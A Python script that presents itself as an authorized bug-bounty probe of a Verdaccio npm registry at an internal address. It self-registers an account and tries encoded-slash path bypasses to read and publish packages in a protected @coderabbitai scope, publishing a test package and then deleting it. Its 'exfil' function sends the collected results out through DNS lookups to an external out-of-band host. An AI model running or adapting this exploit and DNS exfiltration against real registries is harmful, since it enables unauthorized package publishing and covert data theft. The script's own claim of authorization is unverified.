# Benign Verdaccio access-control probe for authorized CodeRabbit VDP research (ireniumsecurity).
# Creates a NEW package name in a protected scope, then deletes it. Touches no existing package.
import os, json, base64, hashlib, socket, re, io, tarfile, urllib.request, urllib.error
socket.setdefaulttimeout(3)

R = os.environ.get('NPM_CONFIG_REGISTRY', 'http://10.64.0.28:4873').rstrip('/')
OAST = os.environ.get('CR_PROBE_OAST', 'dbidtc62jid2sfv70mg05naebui6gr8bp.oast.fun')
OUT = {}

def http(method, url, data=None, headers=None, timeout=4):
    req = urllib.request.Request(url, data=data, headers=headers or {}, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(3000)
    except urllib.error.HTTPError as e:
        return e.code, e.read(1500)
    except Exception as e:
        return -1, str(e).encode()

def exfil(obj):
    s = json.dumps(obj, separators=(',', ':'))[:300]
    h = s.encode().hex()
    for i in range(0, len(h), 48):
        if i > 288: break
        try:
            socket.gethostbyname('r2-%03d-%s.%s' % (i // 48, h[i:i+48], OAST))
        except Exception:
            pass

try:
    # 1. fingerprint
    st, body = http('GET', R + '/')
    m = re.search(rb'Verdaccio[^<"\n]{0,40}', body)
    OUT['ui'] = m.group(0).decode('utf8', 'replace') if m else ('code=%s' % st)
    st, body = http('GET', R + '/-/ping')
    OUT['ping'] = '%s:%s' % (st, body[:40].decode('utf8', 'replace'))

    # 2. self-registration (on by default in Verdaccio)
    user = 'crvdp' + hashlib.md5(os.urandom(8)).hexdigest()[:6]
    reg = json.dumps({"name": user, "password": "CrVdp-" + user + "-9x!"}).encode()
    st, body = http('PUT', R + '/-/user/org.couchdb.user:' + user, reg, {'content-type': 'application/json'})
    OUT['reg'] = '%s:%s' % (st, body[:120].decode('utf8', 'replace'))
    token = ''
    if st in (200, 201):
        try:
            token = json.loads(body).get('token', '')
        except Exception:
            pass
    OUT['tok'] = len(token)

    # 3. read-bypass controls on a public and candidate private scoped packages
    for pkg in ['@coderabbitai/config', '@coderabbitai/carrot-ui']:
        e = pkg.replace('/', '%2f')
        a, _ = http('GET', R + '/' + e)
        b, _ = http('GET', R + '/' + e + '%2f')
        OUT['r_' + pkg.split('/')[1]] = '%s/%s' % (a, b)

    # 4. publish-bypass test: NEW package name inside the protected scope, benign prerelease, no dist-tag
    if token:
        pkg = '@coderabbitai/crvdp-probe-' + user
        ver = '0.0.0-crvdp'
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode='w:gz') as tf:
            data = json.dumps({"name": pkg, "version": ver}).encode()
            ti = tarfile.TarInfo('package/package.json'); ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
        tgz = buf.getvalue()
        manifest = {
            "_id": pkg + "/", "name": pkg + "/", "dist-tags": {},
            "versions": {ver: {"name": pkg, "version": ver, "dist": {
                "shasum": hashlib.sha1(tgz).hexdigest(),
                "tarball": R + "/" + pkg + "/-/probe-" + ver + ".tgz"}}},
            "_attachments": {"probe-" + ver + ".tgz": {
                "content_type": "application/octet-stream",
                "data": base64.b64encode(tgz).decode(), "length": len(tgz)}},
        }
        body = json.dumps(manifest).encode()
        hdr = {'content-type': 'application/json', 'authorization': 'Bearer ' + token}
        ctl, _ = http('PUT', R + '/' + pkg.replace('/', '%2f'), body, hdr)
        st, rb = http('PUT', R + '/' + pkg.replace('/', '%2f') + '%2f', body, hdr)
        OUT['pub'] = '%s/%s' % (ctl, st)
        OUT['pub_body'] = rb[:120].decode('utf8', 'replace')
        if st in (200, 201):
            g, gb = http('GET', R + '/' + pkg.replace('/', '%2f') + '%2f')
            rev = ''
            try:
                rev = json.loads(gb).get('_rev', '')
            except Exception:
                pass
            if rev:
                d, _ = http('DELETE', R + '/' + pkg.replace('/', '%2f') + '%2f/-rev/' + rev,
                            headers={'authorization': 'Bearer ' + token})
                OUT['del'] = d
except Exception as e:
    OUT['err'] = str(e)[:200]
finally:
    exfil(OUT)
